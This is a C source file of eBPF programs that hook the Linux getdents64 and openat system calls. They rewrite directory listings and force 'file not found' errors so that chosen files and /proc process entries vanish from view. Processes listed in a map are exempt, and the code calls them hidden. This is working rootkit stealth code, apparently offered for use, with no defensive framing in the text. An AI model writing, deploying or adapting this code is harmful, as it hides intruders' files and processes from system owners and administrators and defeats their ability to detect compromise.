#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define MAX_DIRENTS 128
#define PREFIX_PROC "/proc/"
#define PREFIX_PROC_LEN 6

/**
 * @brief Loop state passed to bpf_loop callback as context
 * 
 */
struct loop_ctx {
    struct linux_dirent64 *dirp;
    long total_bytes;
    size_t bpos;
    struct linux_dirent64 *prev_dir;
    unsigned short prev_reclen;
};

/**
 * @brief Callback function executed by bpf_loop
 * 
 * @param index 
 * @param data 
 * @return int 
 */
static int patch_dirent_cb(u32 index, void *data)
{
    struct loop_ctx *ctx = data;

    if (ctx->bpos >= ctx->total_bytes)
        return 1; /* Stop iteration */

    struct linux_dirent64 *current_dir = (struct linux_dirent64 *)((char *)ctx->dirp + ctx->bpos);

    unsigned short reclen = 0;
    if (bpf_probe_read_user(&reclen, sizeof(reclen), &current_dir->d_reclen) != 0 || reclen == 0)
        return 1;

    char filename[MAX_NAME_LEN] = { 0 };
    if (bpf_probe_read_user_str(filename, sizeof(filename), current_dir->d_name) > 0) {
        bpf_printk("Filename: %s\n", filename);
        /* Pass array reference to match map key signature */
        u8 *should_hide = bpf_map_lookup_elem(&hide_names_map, &filename);
        if (should_hide) {

            /* Target is not the first entry in the buffer */
            if (ctx->prev_dir != NULL && ctx->prev_reclen > 0) {
                unsigned short new_reclen = ctx->prev_reclen + reclen;
                bpf_probe_write_user(&ctx->prev_dir->d_reclen, &new_reclen, sizeof(new_reclen));
                ctx->prev_reclen = new_reclen;
                ctx->bpos += reclen;
                return 0; /* Continue loop */
            }

            /* Target is the first entry in the buffer.
             * Zeroing d_ino causes to skip the entry. */
            u64 zero_ino = 0;
            bpf_probe_write_user(&current_dir->d_ino, &zero_ino, sizeof(zero_ino));
        }
    }

    ctx->prev_dir = current_dir;
    ctx->prev_reclen = reclen;
    ctx->bpos += reclen;
    return 0;
}

/**
 * @brief getdents64 hook looping through directory entries
 * attempting to hide certain entries.
 * 
 */
SEC("fexit/__x64_sys_getdents64")
int BPF_PROG(hide_getdents64, struct pt_regs *regs, long ret)
{
    if (ret <= 0)
        return 0;

    /* Not hiding from hidden processes */
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    if (bpf_map_lookup_elem(&tracked_pids_map, &pid))
        return 0;

    /* Extracting dirp struct from regs */
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)PT_REGS_PARM2_CORE(regs);

    if (!dirp)
        return 0;

    struct loop_ctx lctx = {
        .dirp = dirp,
        .total_bytes = ret,
        .bpos = 0,
        .prev_dir = NULL,
        .prev_reclen = 0,
    };

    /* Bounded execution using helper (Linux 5.17+) */
    bpf_loop(MAX_DIRENTS, patch_dirent_cb, &lctx, 0);

    return 0;
}

/**
 * @brief openat hook to override return value if target file is in path.
 * 
 */
SEC("kprobe/__x64_sys_openat")
int hide_openat(struct pt_regs *ctx)
{
    /* Extracting the real user pt_regs passed in rdi (PARM1 of kprobe) */
    struct pt_regs *real_regs = (struct pt_regs *)PT_REGS_PARM1(ctx);
    if (!real_regs)
        return 0;

    /* Not hiding from hidden processes */
    pid_t pid = bpf_get_current_pid_tgid() >> 32;
    if (bpf_map_lookup_elem(&tracked_pids_map, &pid))
        return 0;

    /* Extracting filename from rsi of real_regs (PARM2 of openat) */
    const char *filename = NULL;
    bpf_probe_read_kernel(&filename, sizeof(filename), &PT_REGS_PARM2(real_regs));

    char path[256] = { 0 };
    long len = bpf_probe_read_user_str(path, sizeof(path), filename);

    if (len <= 0)
        return 0;

    /* Lookup the extracted name in hide map */
    u8 *should_hide = bpf_map_lookup_elem(&hide_names_map, &path);
    if (should_hide) {
        bpf_override_return((struct pt_regs *)ctx, -ENOENT);
    }

    /* Check if the path starts with prefix */
    for (int i = 0; i < PREFIX_PROC_LEN; i++) {
        if (path[i] != PREFIX_PROC[i])
            return 0;
    }

    /* Extract the name segment following prefix */
    char extracted_name[MAX_NAME_LEN] = { 0 };
    int j = 0;
    for (int i = PREFIX_PROC_LEN; i < sizeof(path) - 1 && j < MAX_NAME_LEN - 1; i++) {
        /* Stop at path separator '/' or end of string */
        if (path[i] == '/' || path[i] == '\0')
            break;
        extracted_name[j++] = path[i];
    }

    /* Lookup the extracted name in hide map */
    should_hide = bpf_map_lookup_elem(&hide_names_map, &extracted_name);
    if (should_hide) {
        bpf_override_return((struct pt_regs *)ctx, -ENOENT);
    }

    return 0;
}
